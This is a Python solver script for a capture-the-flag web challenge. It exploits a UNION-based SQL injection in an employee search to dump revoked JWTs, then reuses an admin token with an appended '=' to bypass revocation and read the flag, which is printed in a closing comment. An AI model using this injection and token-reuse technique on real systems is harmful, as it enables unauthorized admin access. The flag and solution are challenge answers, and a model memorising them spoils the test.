import base64
import json
import re

import requests

chal = "http://dyn08.heroctf.fr:12123"
s = requests.Session()

s.post(f"{chal}/register", data={"username": "solver", "password": "solver"})
s.post(f"{chal}/login", data={"username": "solver", "password": "solver"})

r = s.get(
    f"{chal}/employees",
    params={"query": "' UNION SELECT 1,token,3,4 FROM revoked_tokens--"},
)
tokens = re.findall(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+", r.text)

for token in tokens:
    parts = token.split(".")
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
    if payload.get("is_admin"):
        r = requests.get(
            f"{chal}/admin", cookies={"JWT": token + "="}, allow_redirects=False
        )
        if r.status_code == 200 and "Hero{" in r.text:
            print(re.search(r"Hero\{[^}]+\}", r.text).group())
            break

# Hero{N0t_th4t_r3v0k3d_37d75e49a6578b66652eca1cfe080e5b}
